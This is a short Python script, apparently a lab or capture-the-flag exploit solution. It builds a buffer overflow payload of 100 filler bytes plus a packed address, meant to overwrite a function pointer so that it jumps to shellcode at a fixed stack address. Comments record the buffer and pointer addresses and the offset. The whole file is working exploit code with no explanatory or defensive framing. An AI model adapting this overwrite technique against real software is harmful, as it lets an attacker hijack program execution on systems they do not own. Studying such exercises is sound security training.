import sys, struct

# addr buf: 0x56559040
# addr &f:  0x565590a4
# offset buf -> f = 0x64 = 100 bytes
# SHELLCODE addr (exit shellcode, 8 bytes): 0xffffc5e4

sc_addr = 0xffffc5e4

payload = b"A" * 100 + struct.pack("<I", sc_addr)
sys.stdout.buffer.write(payload)
